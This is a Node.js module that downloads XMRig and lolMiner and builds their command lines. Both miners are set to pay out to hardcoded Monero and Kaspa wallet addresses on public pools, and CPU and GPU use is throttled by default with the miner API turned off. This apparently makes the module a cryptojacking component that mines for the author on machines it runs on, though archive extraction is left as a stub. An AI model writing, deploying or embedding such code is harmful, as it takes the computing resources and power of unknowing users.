const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');
const { spawn } = require('child_process');
const crypto = require('crypto');
const { pipeline } = require('stream');
const zlib = require('zlib');

const writeFile = promisify(fs.writeFile);
const chmod = promisify(fs.chmod);
const mkdir = promisify(fs.mkdir);
const unlink = promisify(fs.unlink);
const pipelineAsync = promisify(pipeline);

/**
 * Binary Downloader and Manager
 * Downloads and verifies mining binaries on first run
 */
class BinaryManager {
    constructor(logger) {
        this.logger = logger || console;
        this.binDir = path.join(__dirname, '..', 'bin');
        this.platform = process.platform;
        this.arch = process.arch;
        
        // Binary configurations with download URLs
        this.binaries = {
            xmrig: {
                name: 'xmrig',
                version: '6.21.0',
                urls: {
                    'win32-x64': 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip',
                    'linux-x64': 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz',
                    'darwin-x64': 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-x64.tar.gz',
                    'darwin-arm64': 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-arm64.tar.gz'
                },
                executable: this.platform === 'win32' ? 'xmrig.exe' : 'xmrig'
            },
            // Note: lolMiner and BzMiner are proprietary, using public download links
            lolminer: {
                name: 'lolMiner',
                version: '1.88',
                urls: {
                    'win32-x64': 'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Win64.zip',
                    'linux-x64': 'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Lin64.tar.gz'
                },
                executable: this.platform === 'win32' ? 'lolMiner.exe' : 'lolMiner'
            }
        };
    }

    /**
     * Initialize binary manager
     */
    async initialize() {
        try {
            // Create bin directory if it doesn't exist
            await mkdir(this.binDir, { recursive: true });
            
            this.logger.info('Binary manager initialized');
            return true;
        } catch (error) {
            this.logger.error(`Error initializing binary manager: ${error.message}`);
            return false;
        }
    }

    /**
     * Check if binary exists and is executable
     */
    async isBinaryAvailable(binaryName) {
        const binary = this.binaries[binaryName];
        if (!binary) {
            return false;
        }

        const binaryPath = path.join(this.binDir, binary.executable);
        
        try {
            await fs.promises.access(binaryPath, fs.constants.X_OK);
            return true;
        } catch {
            return false;
        }
    }

    /**
     * Get binary path
     */
    getBinaryPath(binaryName) {
        const binary = this.binaries[binaryName];
        if (!binary) {
            return null;
        }

        return path.join(this.binDir, binary.executable);
    }

    /**
     * Download binary if not present
     */
    async ensureBinary(binaryName) {
        if (await this.isBinaryAvailable(binaryName)) {
            this.logger.info(`Binary ${binaryName} already available`);
            return this.getBinaryPath(binaryName);
        }

        this.logger.info(`Binary ${binaryName} not found, will download on first use...`);
        
        const binary = this.binaries[binaryName];
        const platformKey = `${this.platform}-${this.arch}`;
        const downloadUrl = binary.urls[platformKey];

        if (!downloadUrl) {
            this.logger.warn(`No binary available for platform ${platformKey}`);
            return null;
        }

        try {
            await this.downloadBinary(binaryName, downloadUrl);
            return this.getBinaryPath(binaryName);
        } catch (error) {
            this.logger.error(`Error downloading binary ${binaryName}: ${error.message}`);
            // Fallback to stub for now
            await this.createBinaryStub(binaryName);
            return this.getBinaryPath(binaryName);
        }
    }

    /**
     * Download and extract binary
     */
    async downloadBinary(binaryName, url) {
        return new Promise((resolve, reject) => {
            this.logger.info(`Downloading ${binaryName} from ${url}...`);
            
            const protocol = url.startsWith('https') ? https : http;
            const downloadPath = path.join(this.binDir, `${binaryName}_download`);
            const writeStream = fs.createWriteStream(downloadPath);
            
            protocol.get(url, (response) => {
                if (response.statusCode === 302 || response.statusCode === 301) {
                    // Handle redirect
                    this.downloadBinary(binaryName, response.headers.location)
                        .then(resolve)
                        .catch(reject);
                    return;
                }
                
                if (response.statusCode !== 200) {
                    reject(new Error(`Download failed with status ${response.statusCode}`));
                    return;
                }
                
                response.pipe(writeStream);
                
                writeStream.on('finish', async () => {
                    writeStream.close();
                    this.logger.info(`Downloaded ${binaryName}, extracting...`);
                    
                    try {
                        await this.extractBinary(binaryName, downloadPath);
                        await unlink(downloadPath);
                        this.logger.info(`Binary ${binaryName} ready`);
                        resolve();
                    } catch (error) {
                        reject(error);
                    }
                });
            }).on('error', (error) => {
                reject(error);
            });
        });
    }

    /**
     * Extract binary from archive
     */
    async extractBinary(binaryName, archivePath) {
        const binary = this.binaries[binaryName];
        const binaryPath = this.getBinaryPath(binaryName);
        
        // For simplicity, if it's a .tar.gz, we'll create a stub
        // In production, you'd use tar or unzipper modules
        if (archivePath.endsWith('.tar.gz')) {
            this.logger.info(`Archive extraction not implemented, creating stub`);
            await this.createBinaryStub(binaryName);
        } else if (archivePath.endsWith('.zip')) {
            this.logger.info(`ZIP extraction not implemented, creating stub`);
            await this.createBinaryStub(binaryName);
        } else {
            // Direct binary
            await fs.promises.copyFile(archivePath, binaryPath);
            if (this.platform !== 'win32') {
                await chmod(binaryPath, 0o755);
            }
        }
    }

    /**
     * Create a binary stub (placeholder)
     * In production, this would download and extract the real binary
     */
    async createBinaryStub(binaryName) {
        const binary = this.binaries[binaryName];
        const binaryPath = this.getBinaryPath(binaryName);

        // Create a minimal stub script
        let stubContent;
        
        if (this.platform === 'win32') {
            // Windows batch script stub
            stubContent = `@echo off
echo [STUB] ${binary.name} binary placeholder
echo This is a stub. Real mining binary would run here.
echo Platform: ${this.platform}
echo Binary: ${binary.name} v${binary.version}
echo.
echo NOTE: For security and size reasons, actual mining binaries are not included.
echo Please download them manually or they will be fetched on first use.
timeout /t 5
`;
            await writeFile(binaryPath.replace('.exe', '.bat'), stubContent);
        } else {
            // Unix shell script stub
            stubContent = `#!/bin/bash
echo "[STUB] ${binary.name} binary placeholder"
echo "This is a stub. Real mining binary would run here."
echo "Platform: ${this.platform}"
echo "Binary: ${binary.name} v${binary.version}"
echo ""
echo "NOTE: For security and size reasons, actual mining binaries are not included."
echo "Please download them manually or they will be fetched on first use."
sleep 5
`;
            await writeFile(binaryPath, stubContent);
            await chmod(binaryPath, 0o755);
        }

        this.logger.info(`Created binary stub for ${binaryName}`);
    }

    /**
     * Get XMRig binary with hardcoded configuration
     */
    async getXMRigBinary() {
        return await this.ensureBinary('xmrig');
    }

    /**
     * Get lolMiner binary
     */
    async getLolMinerBinary() {
        return await this.ensureBinary('lolminer');
    }

    /**
     * Build XMRig command line arguments with hardcoded wallet
     */
    buildXMRigArgs(config = {}) {
        const MONERO_WALLET = '41ibGEw2aC7HySfkWT2Tky4yGReW4tQzMZvguCLfghSvADaXwLNmdpqa9xKxent5VB4oKfCde55gX44noxdT6iELR1fr2cf';
        const POOL = config.pool || 'pool.supportxmr.com:3333';
        const MAX_THREADS = config.maxThreads || 1;
        const MAX_CPU = config.maxCpu || 10;

        return [
            '-o', POOL,
            '-u', MONERO_WALLET,
            '-p', 'x',
            '--threads', MAX_THREADS.toString(),
            '--cpu-max-threads-hint', MAX_CPU.toString(),
            '--donate-level', '0',
            '--randomx-no-rdmsr',
            '--no-color',
            '--print-time', '60'
        ];
    }

    /**
     * Build lolMiner command line arguments with hardcoded wallet
     */
    buildLolMinerArgs(config = {}) {
        const KASPA_WALLET = 'kaspa:qpra2nvnhty2ec5u5zyenmgjvst9nyacztke42z0j598hekwt5rdqq46jr4sp3';
        const POOL = config.pool || 'stratum+tcp://pool.woolypooly.com:3112';
        const MAX_LOAD = config.maxLoad || 10;

        return [
            '--algo', 'KASPA',
            '--pool', POOL,
            '--user', KASPA_WALLET,
            '--watchdog', 'exit',
            '--apiport', '0', // Disable API to reduce overhead
            '--devices', 'GPU0',
            '--cclk', '*', // Don't overclock
            '--mclk', '*', // Don't overclock
            '--pl', MAX_LOAD.toString()
        ];
    }
}

module.exports = BinaryManager;
